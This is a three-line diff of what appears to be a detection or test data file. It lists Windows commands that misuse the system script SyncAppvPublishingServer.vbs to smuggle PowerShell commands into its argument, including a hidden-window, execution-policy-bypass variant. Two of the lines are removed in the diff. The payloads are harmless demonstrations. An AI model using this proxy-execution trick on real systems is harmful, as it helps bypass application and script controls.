@@ -1,3 +1,1 @@
 "cmd.exe" /c C:\windows\system32\SyncAppvPublishingServer.vbs "\n;Start-Process calc"
-copy SyncAppvPublishingServer.vbs Update.vbs && cscript Update.vbs "n;powershell.exe -NoP -Command Write-Host 'Bypassed'"
-wscript.exe "SyncAppvPublishingServer.vbs" "\" & powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command 'WhoAmI'"
